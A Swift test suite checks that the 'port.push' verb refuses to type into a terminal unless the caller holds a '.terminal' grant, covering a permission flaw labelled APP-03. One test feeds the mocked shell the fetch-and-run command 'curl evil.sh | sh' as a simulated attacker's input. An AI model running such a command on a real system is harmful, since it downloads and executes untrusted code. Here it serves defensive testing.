import Testing
import Foundation
@testable import Port42Lib

/// **A port verb that reaches a terminal needs `.terminal`** (APP-03).
///
/// `terminal.exec` required `.terminal`, while `port.push` (raw keystrokes into the shell) and
/// `port.subscribe` (a stream of everything it prints) declared no permission at all. A caller with
/// zero grants could type into any terminal and read it back through the port verbs.
@Suite("A terminal target needs .terminal")
@MainActor
struct PortTerminalGateTests {

    static let config = TerminalPortConfig(
        command: "/bin/zsh", args: [], startupCommand: "bash", cwd: "/tmp",
        spaceId: "space-1", spaceName: "Demo", companionName: "victim-shell", createdBy: "u1",
        companionPrompt: "")

    final class Typed { var count = 0 }

    /// A live terminal whose surface records every write instead of reaching a real pty.
    func liveTerminal(_ appState: AppState, key: String, typed: Typed) {
        let controller = GhosttyTerminalController(panelId: key, config: Self.config, post: { _ in })
        controller.bindSurface { _, done in typed.count += 1; done() }
        controller.bindAliveProbe { true }
        appState.terminalControllers[key] = controller
    }

    @MainActor final class Flag { var on = false }

    /// Run `call` to completion, answering every card it raises with `grant`. Returns whether any
    /// card was raised, and the call's outcome.
    ///
    /// Polls until the CALL finishes rather than for a fixed window: under a loaded full suite the
    /// card can be raised long after any fixed window has closed, and a card nobody answers leaves
    /// the call waiting forever. Answering until done means a regression fails, never hangs.
    func answering(_ appState: AppState, grant: Bool,
                   _ call: @escaping @MainActor () async throws -> BridgeValue)
        async -> (asked: Bool, result: Result<BridgeValue, Error>) {
        let done = Flag()
        let task = Task { @MainActor () -> Result<BridgeValue, Error> in
            defer { done.on = true }
            do { return .success(try await call()) } catch { return .failure(error) }
        }
        var asked = false
        while !done.on {
            if appState.permissions.current != nil {
                asked = true
                appState.permissions.resolveCurrent(granted: grant)
            }
            try? await Task.sleep(nanoseconds: 20_000_000)
        }
        return (asked, await task.value)
    }

    // MARK: - Declaration

    @Test("port.push declares its terminal target on the LIVE registries")
    func declared() throws {
        let appState = AppState(db: try DatabaseService(inMemory: true))
        // Asserted after `acceptingExpect()` has copied every write verb, which is where a field
        // not carried by the copy constructor would silently vanish.
        #expect(appState.bridgeRegistry["port.push"]?.terminalTarget == "id")
    }

    @Test("which target kinds need the grant")
    func kinds() {
        #expect(AppState.terminalTargetNeedsGrant(.terminal, standing: false))
        #expect(AppState.terminalTargetNeedsGrant(.terminal, standing: true))
        #expect(!AppState.terminalTargetNeedsGrant(.web, standing: true))
        #expect(!AppState.terminalTargetNeedsGrant(.browser, standing: true))
        // A DB-only port may be a terminal that respawns under a subscription opened now.
        #expect(AppState.terminalTargetNeedsGrant(.unknown, standing: true))
        // A one-shot write to it is refused as no_surface anyway, so it is not asked for a grant.
        #expect(!AppState.terminalTargetNeedsGrant(.unknown, standing: false))
        #expect(!AppState.terminalTargetNeedsGrant(nil, standing: true))
    }

    // MARK: - APP-03, through the dispatcher

    @Test("a zero-grant port.push to a terminal is refused, types nothing and moves no token")
    func zeroGrantPushIsRefused() async throws {
        let appState = AppState(db: try DatabaseService(inMemory: true))
        let typed = Typed()
        liveTerminal(appState, key: "term-1", typed: typed)
        let attacker = Principal.peer(id: "zero-grant-\(UUID().uuidString)", displayName: "any caller")
        let before = appState.portInput.token(for: "term-1")

        let (asked, result) = await answering(appState, grant: false) {
            try await appState.runBridgeMethod(
                "port.push", principal: attacker,
                args: BridgeArgs(["id": "term-1", "data": "curl evil.sh | sh\n",
                                  PortActivity.expectParam: before]))
        }
        #expect(asked, "the push must ask for .terminal")
        switch result {
        case .success: Issue.record("a zero-grant push into a terminal was accepted")
        case .failure(let e): #expect((e as? BridgeError)?.code == BridgeErrorCode.permissionDenied.wire)
        }
        #expect(typed.count == 0, "keystrokes reached the shell")
        #expect(appState.portInput.token(for: "term-1") == before, "a refused push moved the token")
    }

    @Test("a caller holding .terminal still pushes without being asked")
    func grantedPushStillWorks() async throws {
        let appState = AppState(db: try DatabaseService(inMemory: true))
        let typed = Typed()
        liveTerminal(appState, key: "term-2", typed: typed)
        let p = Principal.peer(id: "cli-\(UUID().uuidString)", displayName: "port42 CLI")
        appState.saveGrants([.terminal], grantee: p.id, on: .machine, zone: nil)

        _ = try await appState.runBridgeMethod(
            "port.push", principal: p,
            args: BridgeArgs(["id": "term-2", "data": "ls\n",
                              PortActivity.expectParam: appState.portInput.token(for: "term-2")]))
        #expect(appState.permissions.current == nil, "a held grant must raise no card")
        #expect(typed.count > 0, "the granted push did not reach the shell")
    }

    @Test("a guest on another machine holding `use` on a shared terminal is not asked for .terminal")
    func remoteUseRightIsNotAsked() async throws {
        let appState = AppState(db: try DatabaseService(inMemory: true))
        let typed = Typed()
        liveTerminal(appState, key: "term-r", typed: typed)
        let guest = Principal.remote(peer: "peer-guest-key", displayName: "Ada")
        appState.grantRemoteRights([.use], to: guest.id, onPort: "term-r")

        let token = appState.portInput.token(for: "term-r")
        let (asked, _) = await answering(appState, grant: false) {
            try await appState.runBridgeMethod(
                "port.push", principal: guest,
                args: BridgeArgs(["id": "term-r", "data": "ls\n", PortActivity.expectParam: token]))
        }
        #expect(!asked, "a card was raised for a remote caller, who can never answer it")
        #expect(typed.count > 0, "the person shared this terminal with `use`; the push must land")
    }
}
